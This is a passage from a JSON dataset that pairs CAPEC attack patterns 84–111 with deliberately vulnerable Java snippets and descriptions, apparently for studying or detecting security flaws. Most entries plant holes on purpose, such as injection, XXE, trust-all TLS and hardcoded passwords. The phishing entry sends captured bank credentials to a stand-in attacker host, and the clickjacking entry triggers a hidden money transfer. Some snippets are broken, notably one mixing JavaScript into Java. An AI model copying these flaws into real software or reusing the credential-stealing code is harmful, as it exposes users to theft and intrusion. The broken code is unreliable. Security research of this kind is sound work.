        "description": "This vulnerable code demonstrates XQuery injection by directly concatenating user input into an XQuery expression without proper validation or sanitization. An attacker could inject malicious XQuery commands by manipulating the customerInput parameter, potentially accessing or modifying unauthorized data in the XML database."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "public class AjaxScanner {\n    private static final String[] AJAX_ENDPOINTS = {\"/user\", \"/admin\", \"/config\", \"/api\"};\n    \n    public void scanTarget(String baseUrl) {\n        for (String endpoint : AJAX_ENDPOINTS) {\n            try {\n                String userInput = \"<script>alert('XSS')</script>\";\n                String url = baseUrl + endpoint + \"?param=\" + userInput;\n                \n                XMLHttpRequest xhr = new XMLHttpRequest();\n                xhr.open(\"GET\", url, true);\n                xhr.setRequestHeader(\"X-Requested-With\", \"XMLHttpRequest\");\n                xhr.setRequestHeader(\"Content-Type\", \"text/plain\\r\\nX-Injected: malicious\");\n                \n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState == 4) {\n                        String response = xhr.responseText;\n                        // Store unvalidated response directly\n                        document.getElementById(\"result\").innerHTML = response;\n                    }\n                };\n                xhr.send();\n            } catch(Exception e) {\n                continue;\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an Ajax-based scanning mechanism that exploits multiple security weaknesses. It performs rapid requests to various endpoints, includes unescaped user input, fails to validate responses, and injects malicious headers. The code is vulnerable to XSS (CWE-79), HTTP Response Splitting (CWE-113), and improper input validation (CWE-20). It directly renders unvalidated responses to the DOM and uses unencoded parameters in URLs."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "public class VulnerableHeaderServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"userInput\");\n        String referer = request.getHeader(\"Referer\");\n        \n        // Vulnerable: Setting unvalidated input in response headers\n        response.setHeader(\"X-Custom-Header\", userInput);\n        \n        // Vulnerable: Reflecting user input without proper escaping\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<img src='\" + userInput + \"' />\");\n        out.println(\"<div>You were referred from: \" + referer + \"</div>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This code demonstrates multiple XSS vulnerabilities through unvalidated input in HTTP headers and HTML content. It accepts user input and a Referer header value, then reflects them directly in both a custom response header and HTML content without proper sanitization. The code is vulnerable to XSS through header injection and unsafe IMG tag attribute handling."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "public class UnsecureServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String requestedPage = request.getParameter(\"page\");\n        String userRole = (String) request.getSession().getAttribute(\"role\");\n        \n        // Vulnerable direct file access without proper authorization\n        File file = new File(\"/webapp/pages/\" + requestedPage);\n        if (file.exists()) {\n            // No proper role check before serving content\n            FileInputStream fis = new FileInputStream(file);\n            byte[] content = new byte[(int) file.length()];\n            fis.read(content);\n            response.getWriter().write(new String(content));\n            fis.close();\n        }\n    }\n    \n    protected void processAdminRequest(HttpServletRequest request) {\n        // Sensitive operation exposed through direct URL access\n        if (request.getParameter(\"action\").equals(\"deleteUser\")) {\n            String userId = request.getParameter(\"userId\");\n            deleteUser(userId); // No authorization check\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable servlet implementation that enables forced browsing by failing to implement proper authorization checks. It allows direct access to files through URL parameters and exposes sensitive administrative functions without proper access control. The code also includes sensitive information in GET request parameters and performs file operations without proper security boundaries."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "public void executeCommand(String userInput) {\n    try {\n        String command = \"cmd.exe /c dir \" + userInput;\n        Process process = Runtime.getRuntime().exec(command);\n        process.waitFor();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}",
        "description": "This code demonstrates OS command injection vulnerability by directly concatenating unvalidated user input into a command string that is executed by the system. The code fails to sanitize special characters or validate input, allowing attackers to inject arbitrary OS commands through the userInput parameter."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "public class OnlineBankingPortal {\n    private static final String TRUSTED_DNS = \"bank.com\";\n\n    public boolean validateConnection(String clientIP) {\n        try {\n            // Vulnerable: Relies solely on reverse DNS lookup for authentication\n            InetAddress addr = InetAddress.getByName(clientIP);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: No proper origin validation\n            if(hostname.endsWith(TRUSTED_DNS)) {\n                return true;\n            }\n            \n            // Vulnerable: Processes user data without validation\n            String userInput = request.getParameter(\"accountNumber\");\n            response.getWriter().println(\"Account Details: \" + userInput);\n            \n            // Vulnerable: Downloads and executes code without verification\n            URL updateUrl = new URL(\"http://\" + hostname + \"/updates/security.jar\");\n            URLClassLoader loader = new URLClassLoader(new URL[]{updateUrl});\n            loader.loadClass(\"SecurityUpdate\").newInstance();\n            \n            return false;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code represents a vulnerable online banking portal that demonstrates multiple security flaws related to pharming attacks. It incorrectly relies on reverse DNS lookup for authentication, lacks proper origin validation, processes user input without proper sanitization, and downloads/executes code without integrity verification. These vulnerabilities could allow an attacker to redirect users to malicious sites and compromise sensitive banking information."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "public class SimpleAuthenticationServer {\n    private static Map<String, String> users = new HashMap<>();\n    private static String currentChallenge;\n\n    public static boolean authenticate(String username, String response) {\n        // Vulnerable implementation of challenge-response authentication\n        String challenge = generateChallenge();\n        currentChallenge = challenge;\n        \n        // Send challenge to client (simplified)\n        sendChallenge(challenge);\n        \n        // Verify response\n        String expectedResponse = users.get(username);\n        // Vulnerable: directly comparing response without considering replay attacks\n        return response.equals(expectedResponse);\n    }\n    \n    private static String generateChallenge() {\n        // Weak challenge generation - uses predictable pattern\n        return \"CHALLENGE_\" + System.currentTimeMillis();\n    }\n    \n    private static void sendChallenge(String challenge) {\n        // Simplified network communication\n        // Vulnerable: challenge sent without encryption or proper session binding\n        System.out.println(\"Sending challenge: \" + challenge);\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of a challenge-response authentication protocol. The vulnerabilities include: lack of protection against reflection attacks (CWE-301), incorrect implementation of the authentication algorithm (CWE-303), susceptibility to capture-replay attacks (CWE-294), and weak challenge generation that could enable authentication bypass through spoofing (CWE-290). The code uses predictable challenge generation and performs simple string comparison for authentication verification without proper cryptographic measures or session management."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "public class ImageGallery {\n    public String buildImageTag(String userInput) {\n        // Direct use of user input in image tag without proper sanitization\n        String imgTag = \"<img src='\" + userInput + \"' alt='User Image'>\";\n        return imgTag;\n    }\n\n    public void displayUserImage(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userProvidedUrl = request.getParameter(\"imageUrl\");\n        String imageTag = buildImageTag(userProvidedUrl);\n        response.getWriter().write(imageTag);\n    }\n}",
        "description": "The code is vulnerable to XSS attacks through improper handling of IMG tag attributes. It directly concatenates user input into an HTML IMG tag without sanitizing special characters or validating the input. An attacker can inject malicious JavaScript through the src attribute, using techniques like doubled characters or alternate XSS syntax, exploiting the lack of input validation and sanitization."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "public class VulnerableAllocator {\n    public byte[] createBuffer(int userInput) {\n        int size = userInput + 100;  // Potential integer overflow\n        if (size > 0) {\n            byte[] buffer = new byte[size];  // May allocate wrong size due to overflow\n            for (int i = 0; i < userInput; i++) {\n                buffer[i] = (byte) 0x41;  // Potential buffer overflow if userInput > size\n            }\n            return buffer;\n        }\n        return null;\n    }\n\n    public static void main(String[] args) {\n        VulnerableAllocator va = new VulnerableAllocator();\n        va.createBuffer(Integer.MAX_VALUE - 50);  // Will cause overflow\n    }\n}",
        "description": "This code demonstrates an integer overflow vulnerability where a user-controlled input is used to calculate a buffer size. The addition of userInput + 100 can overflow, resulting in a smaller allocation than intended. The subsequent loop writing to the buffer may overflow due to the size miscalculation, potentially corrupting heap memory. The code also includes an insufficient size check that fails to detect the overflow condition."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "public class LoggingService {\n    private static final Logger logger = Logger.getLogger(LoggingService.class.getName());\n\n    public void logUserActivity(String username, String action) {\n        String logMessage = username + \" performed action: \" + action;\n        logger.info(logMessage);\n    }\n\n    public void logLoginAttempt(HttpServletRequest request) {\n        String userInput = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n        String clientIP = request.getRemoteAddr();\n\n        // Vulnerable: Direct logging of unsanitized user input\n        String logEntry = String.format(\"Login attempt - Username: %s, Password: %s, IP: %s\",\n                userInput, password, clientIP);\n        logger.info(logEntry);\n\n        // Vulnerable: Logging sensitive data\n        String sessionId = request.getSession().getId();\n        logger.debug(\"Session details - ID: \" + sessionId);\n    }\n\n    public void appendToLogFile(String customLogEntry) {\n        try {\n            FileWriter fw = new FileWriter(\"app.log\", true);\n            // Vulnerable: Direct writing of unsanitized input to log file\n            fw.write(customLogEntry + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple logging vulnerabilities including improper output neutralization (CWE-117), failure to sanitize special elements (CWE-75), logging of sensitive information (CWE-532), and potential for log injection attacks. The code directly logs unsanitized user input, sensitive data like passwords and session IDs, and allows direct writing to log files without proper access controls or input validation."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "public class InsecureConnectionHandler {\n    private Socket clientSocket;\n    private SSLContext sslContext;\n    \n    public void initializeConnection() {\n        try {\n            sslContext = SSLContext.getInstance(\"SSL\");\n            sslContext.init(null, new TrustManager[] {\n                new X509TrustManager() {\n                    public X509Certificate[] getAcceptedIssuers() { return null; }\n                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}\n                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}\n                }\n            }, null);\n            \n            SSLSocketFactory factory = sslContext.getSocketFactory();\n            clientSocket = factory.createSocket(\"server.com\", 443);\n            \n            // Modifying SSL context after connection creation\n            sslContext.init(null, null, null);\n            \n            // No endpoint verification\n            handleClientRequests();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void handleClientRequests() {\n        try {\n            DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n            String authToken = in.readUTF();\n            \n            // No proper authentication verification\n            if (authToken != null) {\n                processRequest();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to man-in-the-middle attacks and authentication bypass. It uses a trust-all certificate validator, modifies the SSL context after connection creation, lacks proper endpoint verification, and implements weak authentication that's susceptible to replay attacks. The code accepts any non-null authentication token without proper verification, making it vulnerable to spoofing attacks."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import javax.jws.WebService;\nimport javax.jws.WebMethod;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\n\n@WebService(name = \"BankService\")\npublic class BankServiceImpl {\n    private static final String DB_URL = \"jdbc:mysql://localhost:3306/bankdb\";\n    private static final String DB_USER = \"admin\";\n    private static final String DB_PASSWORD = \"secretpass123\";\n\n    @WebMethod\n    public String getAccountDetails(String accountId) {\n        try {\n            Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASSWORD);\n            // Exposing sensitive configuration in stack trace\n            if(conn == null) throw new RuntimeException(\"Failed to connect to \" + DB_URL);\n            \n            return \"Account Details for: \" + accountId + \n                   \"\\nDatabase: \" + DB_URL +\n                   \"\\nSystem Path: \" + System.getProperty(\"user.dir\") +\n                   \"\\nJava Version: \" + System.getProperty(\"java.version\");\n        } catch(Exception e) {\n            e.printStackTrace();\n            return e.toString();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a web service implementation that exposes sensitive information through its WSDL interface and error messages. It includes hardcoded database credentials, system paths, and configuration details directly in the service implementation. The service also returns sensitive system information and database connection details to clients, and prints full stack traces when errors occur. The WSDL file generated from this service would expose the method signatures and implementation details to potential attackers."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "public class LibraryAccessExample {\n    static {\n        try {\n            System.loadLibrary(\"custom_lib\");\n        } catch (UnsatisfiedLinkError e) {\n            // Insecure: continues execution without proper validation\n            System.err.println(\"Failed to load library\");\n        }\n    }\n\n    public native void processData(byte[] data);\n\n    public void handleUserInput(String input) {\n        byte[] buffer = new byte[100];\n        try {\n            // Vulnerable: No bounds checking on input length\n            input.getBytes(0, input.length(), buffer, 0);\n            processData(buffer);\n        } catch (Exception e) {\n            // Insecure: Continues operation after failure\n            System.out.println(\"Error processing data\");\n        }\n    }\n\n    public void blockingOperation() {\n        // Vulnerable: Blocking operation in single-threaded context\n        while(true) {\n            try {\n                Thread.sleep(1000);\n                processData(new byte[]{1,2,3});\n            } catch (InterruptedException e) {\n                break;\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of external library dependencies, including unsafe native library loading, lack of proper bounds checking on memory buffers, and blocking operations in a single-threaded context. The code continues execution after library loading failures and memory operations without proper validation, potentially leaving the system in an insecure state."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "public class WeakCrypto {\n    private static final String STATIC_KEY = \"abc123\";\n    private static final String STATIC_IV = \"1234567890123456\";\n    \n    public static String encrypt(String plaintext) {\n        try {\n            // Using weak algorithm DES\n            Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n            \n            // Using static key and IV\n            SecretKeySpec keySpec = new SecretKeySpec(STATIC_KEY.getBytes(), \"DES\");\n            IvParameterSpec ivSpec = new IvParameterSpec(STATIC_IV.getBytes());\n            \n            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);\n            byte[] encrypted = cipher.doFinal(plaintext.getBytes());\n            return Base64.getEncoder().encodeToString(encrypted);\n            \n        } catch (Exception e) {\n            return null;\n        }\n    }\n    \n    public static SecureRandom getWeakRandom() {\n        // Using predictable seed\n        return new SecureRandom(\"fixed_seed\".getBytes());\n    }\n}",
        "description": "This vulnerable code demonstrates multiple cryptographic weaknesses including: use of outdated DES algorithm (CWE-327), static initialization vector (CWE-1204), predictable random number generation with fixed seed (CWE-1241), and hardcoded cryptographic key. These vulnerabilities make the encryption susceptible to cryptanalysis attacks, allowing potential attackers to decrypt messages without the key or predict random values."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "public class FakeLoginPage extends JFrame {\n    private JTextField usernameField;\n    private JPasswordField passwordField;\n    \n    public FakeLoginPage() {\n        setTitle(\"Bank Account Login\");\n        setIconImage(new ImageIcon(\"bank_logo.png\").getImage());\n        \n        usernameField = new JTextField(20);\n        passwordField = new JPasswordField(20);\n        JButton loginButton = new JButton(\"Login\");\n        \n        loginButton.addActionListener(e -> {\n            String username = usernameField.getText();\n            String password = new String(passwordField.getPassword());\n            \n            try {\n                // Secretly send credentials to attacker's server\n                URL url = new URL(\"https://malicious-site.com/collect.php\");\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(\"POST\");\n                conn.setDoOutput(true);\n                \n                String data = \"username=\" + username + \"&password=\" + password;\n                conn.getOutputStream().write(data.getBytes());\n                \n                // Redirect to legitimate site to avoid suspicion\n                Desktop.getDesktop().browse(new URI(\"https://real-bank.com\"));\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        });\n    }\n}",
        "description": "This code demonstrates a malicious phishing application that masquerades as a legitimate bank login page. It captures user credentials through a fake UI and secretly sends them to an attacker's server while redirecting the user to the legitimate bank site to avoid detection. The code incorporates UI misrepresentation (CWE-451), malicious redirection (CWE-601), embedded malicious code (CWE-506), and spyware behavior (CWE-512)."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "public class XMLProcessor {\n    public void processXMLRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {\n        String xmlInput = request.getParameter(\"xml\");\n        \n        // Vulnerable: No XML validation against schema\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        // Vulnerable: XXE enabled by default\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        \n        // Vulnerable: Processing XML without sanitization\n        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n        \n        // Vulnerable: Using XML content directly in XPath query\n        XPath xpath = XPathFactory.newInstance().newXPath();\n        String query = \"//users/user[@name='\" + xmlInput + \"']/password\";\n        String result = xpath.evaluate(query, doc);\n        \n        // Vulnerable: Writing response without proper encoding\n        response.getWriter().write(result);\n    }\n}",
        "description": "This code demonstrates multiple XML-related vulnerabilities including XML injection, missing XML validation, and XXE (XML External Entity) processing. It accepts untrusted XML input, fails to validate it against a schema, enables XXE processing by default, and uses the input directly in XPath queries without proper sanitization. The code also writes responses without proper encoding, potentially leading to HTTP response splitting."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "public class VulnerableBufferCopy {\n    public static void copyUserData(String input) {\n        byte[] buffer = new byte[8];\n        byte[] inputData = input.getBytes();\n        \n        // Vulnerable: No size check before copy\n        System.arraycopy(inputData, 0, buffer, 0, inputData.length);\n        \n        // Process the buffer...\n        processBuffer(buffer);\n    }\n    \n    private static void processBuffer(byte[] data) {\n        // Process the data...\n    }\n    \n    public static void main(String[] args) {\n        String userInput = args[0];\n        copyUserData(userInput);\n    }\n}",
        "description": "This code demonstrates a classic buffer overflow vulnerability where user input is copied into a fixed-size buffer without size validation. The buffer is allocated with size 8, but the code copies the entire input regardless of its length, potentially overflowing the buffer. The vulnerability occurs in the System.arraycopy() call where inputData.length is used without checking if it exceeds the destination buffer size."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "public void processUserInput(HttpServletRequest request, HttpServletResponse response) throws IOException {\n    String userInput = request.getParameter(\"message\");\n    String fileName = \"/var/www/html/page.shtml\";\n    \n    FileWriter writer = new FileWriter(fileName);\n    writer.write(\"<!--#include virtual=\\\"\" + userInput + \"\\\" -->\");\n    writer.close();\n    \n    response.sendRedirect(\"/page.shtml\");\n}",
        "description": "This code accepts user input and directly embeds it into an SSI directive without any validation or sanitization. It creates a Server Side Include file (.shtml) that processes the user-supplied path, allowing potential access to sensitive files or command execution through SSI directives like <!--#exec cmd-->."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "public class InsecureSessionManager {\n    private static Map<String, String> sessions = new HashMap<>();\n\n    public static String createSession(String username) {\n        String sessionId = UUID.randomUUID().toString();\n        sessions.put(sessionId, username);\n        \n        // Create cookie without secure flag and using HTTP\n        Cookie cookie = new Cookie(\"sessionId\", sessionId);\n        cookie.setHttpOnly(false);\n        cookie.setSecure(false);\n        \n        // Send session token over HTTP without encryption\n        HttpServletResponse response = getResponse();\n        response.addCookie(cookie);\n        \n        // Store credentials in plaintext\n        String credentials = username + \":\" + sessionId;\n        storeCredentials(credentials);\n        \n        return sessionId;\n    }\n\n    private static void storeCredentials(String credentials) {\n        try {\n            FileWriter writer = new FileWriter(\"sessions.txt\", true);\n            writer.write(credentials + \"\\n\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to session management, including transmission of session tokens over unencrypted HTTP, storage of credentials in plaintext, and cookies without secure flags. The code allows for easy session token capture and replay attacks, making it susceptible to session sidejacking."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "public class UnsafeFrameHandler extends JFrame {\n    private boolean isProcessing = false;\n    private JButton loginButton;\n    private JFrame hiddenFrame;\n\n    public UnsafeFrameHandler() {\n        setLayout(new BorderLayout());\n        loginButton = new JButton(\"Login to Bank\");\n\n        loginButton.addActionListener(e -> {\n            if (!isProcessing) {\n                isProcessing = true;\n                // Create hidden frame that looks identical to bank login\n                hiddenFrame = new JFrame(\"Secure Banking Login\");\n                hiddenFrame.setUndecorated(true);\n                hiddenFrame.setOpacity(0.01f);\n                hiddenFrame.setSize(getSize());\n                hiddenFrame.setLocation(getLocation());\n                hiddenFrame.setVisible(true);\n                \n                // Malicious action executed when user thinks they're clicking login\n                processUserAction(() -> {\n                    try {\n                        transferMoney(\"attacker_account\", 1000);\n                    } finally {\n                        isProcessing = false;\n                    }\n                });\n            }\n        });\n        add(loginButton);\n    }\n\n    private void processUserAction(Runnable action) {\n        // Non-reentrant code that can be nested due to race condition\n        SwingUtilities.invokeLater(action);\n    }\n\n    private void transferMoney(String account, double amount) {\n        // Simulated money transfer\n        System.out.println(\"Transferring \" + amount + \" to \" + account);\n    }\n}",
        "description": "This vulnerable code creates a UI that tricks users by overlaying a nearly invisible frame on top of a legitimate-looking banking interface. When users attempt to interact with what they believe is the legitimate interface, their actions are actually processed by the hidden malicious frame. The code exhibits multiple vulnerabilities including improper UI layer restrictions, context switching race conditions, and potential for misinterpretation of user input. The non-reentrant code in processUserAction can be exploited through nested calls, and the hidden frame contains embedded malicious code that executes unauthorized transactions."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "public class WebBrowserPlugin {\n    private static final String TRUSTED_ZONE = \"trusted\";\n    \n    public void loadContent(String content, String zone) {\n        // Insufficient zone validation\n        if (zone.toLowerCase().contains(TRUSTED_ZONE)) {\n            executeWithPrivileges(content);\n        }\n    }\n    \n    private void executeWithPrivileges(String content) {\n        try {\n            // Unsafe execution with elevated privileges\n            System.setSecurityManager(null);\n            \n            // No input validation or encoding\n            ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"javascript\");\n            engine.eval(content);\n            \n            // Cached authorization without complete mediation\n            AccessController.doPrivileged(new PrivilegedAction<Void>() {\n                public Void run() {\n                    executeUnsafeCode(content);\n                    return null;\n                }\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void executeUnsafeCode(String content) {\n        // Execute potentially malicious content with elevated privileges\n        Runtime.getRuntime().exec(content);\n    }\n}",
        "description": "This vulnerable code demonstrates a browser plugin that fails to properly validate security zones and executes content with elevated privileges. It contains multiple security issues: improper authorization checks, insufficient input validation, privilege elevation without proper controls, lack of complete mediation for access checks, and unsafe execution of user-provided content."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "public class HttpProxyHandler {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        String contentLength = request.getHeader(\"Content-Length\");\n        String transferEncoding = request.getHeader(\"Transfer-Encoding\");\n        \n        StringBuilder forwardRequest = new StringBuilder();\n        forwardRequest.append(request.getMethod())\n                      .append(\" \")\n                      .append(request.getRequestURI())\n                      .append(\" HTTP/1.1\\r\\n\");\n        \n        // Vulnerable: No validation of headers or encoding\n        if (contentLength != null) {\n            forwardRequest.append(\"Content-Length: \")\n                         .append(contentLength)\n                         .append(\"\\r\\n\");\n        }\n        if (transferEncoding != null) {\n            forwardRequest.append(\"Transfer-Encoding: \")\n                         .append(transferEncoding)\n                         .append(\"\\r\\n\");\n        }\n        \n        // Vulnerable: Direct forwarding of user input without sanitization\n        String userInput = request.getParameter(\"data\");\n        forwardRequest.append(\"\\r\\n\").append(userInput);\n        \n        // Forward the request to backend server\n        sendToBackend(forwardRequest.toString());\n    }\n    \n    private void sendToBackend(String request) {\n        // Implementation of sending request to backend\n    }\n}",
        "description": "This vulnerable code demonstrates HTTP request smuggling by failing to properly validate and sanitize HTTP headers and request content. It allows an attacker to craft malicious requests with ambiguous Content-Length and Transfer-Encoding headers, potentially leading to request smuggling attacks. The code also fails to neutralize CRLF sequences and special characters in user input, enabling HTTP header injection and request splitting attacks."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "public class LogViewer extends HttpServlet {\n    private static final Logger logger = Logger.getLogger(LogViewer.class);\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"user\");\n        String htmlContent = \"<html><body>\";\n        \n        // Vulnerable logging of user input\n        logger.info(\"User accessed: \" + userInput);\n        \n        // Vulnerable XSS - incomplete sanitization\n        String sanitized = userInput.replace(\"<script>\", \"\");\n        \n        // Vulnerable image tag rendering\n        htmlContent += \"<img src='\" + sanitized + \"' alt='User Image'>\";\n        htmlContent += \"<div>Welcome \" + sanitized + \"!</div>\";\n        htmlContent += \"</body></html>\";\n        \n        response.setContentType(\"text/html\");\n        response.getWriter().write(htmlContent);\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including improper log sanitization allowing log injection, and incomplete XSS protection through a naive denylist approach. It also shows unsafe rendering of user input in HTML IMG tags. The code logs raw user input and attempts to prevent XSS by only removing '<script>' tags, leaving many other attack vectors open. User input is directly embedded into IMG tag attributes and HTML content without proper encoding."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "public class VulnerableXSTServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n        try {\n            // Vulnerable configuration allowing TRACE method\n            String method = request.getMethod();\n            \n            // No validation of HTTP method\n            // No protection against XST attacks\n            Cookie[] cookies = request.getCookies();\n            \n            // Echo back headers and cookies without protection\n            response.setContentType(\"text/html\");\n            PrintWriter out = response.getWriter();\n            out.println(\"<html><body>\");\n            out.println(\"<h1>Request Headers and Cookies:</h1>\");\n            \n            // Vulnerable header reflection\n            Enumeration<String> headerNames = request.getHeaderNames();\n            while(headerNames.hasMoreElements()) {\n                String headerName = headerNames.nextElement();\n                out.println(headerName + \": \" + request.getHeader(headerName) + \"<br>\");\n            }\n            \n            // Vulnerable cookie reflection\n            if(cookies != null) {\n                for(Cookie cookie : cookies) {\n                    out.println(\"Cookie: \" + cookie.getName() + \"=\" + cookie.getValue() + \"<br>\");\n                }\n            }\n            out.println(\"</body></html>\");\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable servlet that allows Cross-Site Tracing (XST) attacks by not properly restricting the HTTP TRACE method and reflecting back headers and cookies without proper protection. The servlet does not implement any CSRF protection, fails to validate HTTP methods, and directly reflects user input without sanitization, making it vulnerable to XST attacks that could steal session cookies and other sensitive header information."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "public class DatabaseCommandExecutor {\n    private Connection conn;\n    \n    public void storeAndExecuteCommand(String userInput) throws SQLException {\n        String insertSQL = \"INSERT INTO stored_commands (command_text) VALUES ('\" + userInput + \"')\";\n        Statement stmt = conn.createStatement();\n        stmt.executeUpdate(insertSQL);\n        \n        // Later, retrieve and execute the command\n        String retrieveSQL = \"SELECT command_text FROM stored_commands\";\n        ResultSet rs = stmt.executeQuery(retrieveSQL);\n        \n        while(rs.next()) {\n            String command = rs.getString(\"command_text\");\n            try {\n                Runtime.getRuntime().exec(command);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a two-stage SQL and command injection vulnerability. It first stores unsanitized user input directly into a database using string concatenation, making it susceptible to SQL injection. Later, it retrieves this stored data and executes it as a system command without validation, enabling OS command injection. The code violates multiple security principles by failing to validate input, not using prepared statements for SQL queries, and executing untrusted data as system commands."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "public class UserService {\n    @Autowired\n    private EntityManager entityManager;\n\n    public User findUserByName(String name) {\n        String hql = \"FROM User WHERE username = '\" + name + \"'\";\n        Query query = entityManager.createQuery(hql);\n        return (User) query.getSingleResult();\n    }\n\n    public List<User> findUsersByRole(String role) {\n        Session session = entityManager.unwrap(Session.class);\n        String sql = \"SELECT * FROM users WHERE role = \" + role;\n        NativeQuery<?> query = session.createSQLQuery(sql);\n        return query.list();\n    }\n}",
        "description": "This code demonstrates vulnerable Hibernate/JPA usage where raw user input is directly concatenated into HQL and native SQL queries without proper parameterization. The code bypasses Hibernate's built-in protection mechanisms by constructing queries through string concatenation, making it susceptible to both HQL and SQL injection attacks."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "public class SoapService {\n    @WebMethod\n    public String getUserDetails(String soapRequest) {\n        try {\n            // Parse SOAP request to get parameters\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(soapRequest)));\n            \n            String userId = doc.getElementsByTagName(\"userId\").item(0).getTextContent();\n            \n            // Vulnerable database query construction\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost/users\", \"user\", \"pass\");\n            String query = \"SELECT * FROM users WHERE id = \" + userId;\n            \n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            \n            // Return sensitive error messages\n            return buildSoapResponse(rs);\n        } catch (Exception e) {\n            return \"Error: \" + e.getMessage();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable SOAP web service that processes user input from a SOAP message and uses it directly in SQL queries without proper validation or parameter binding. It includes multiple vulnerabilities: SQL injection through unvalidated SOAP parameters, improper input validation, sensitive information disclosure in error messages, and direct use of user input in database queries without proper sanitization."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
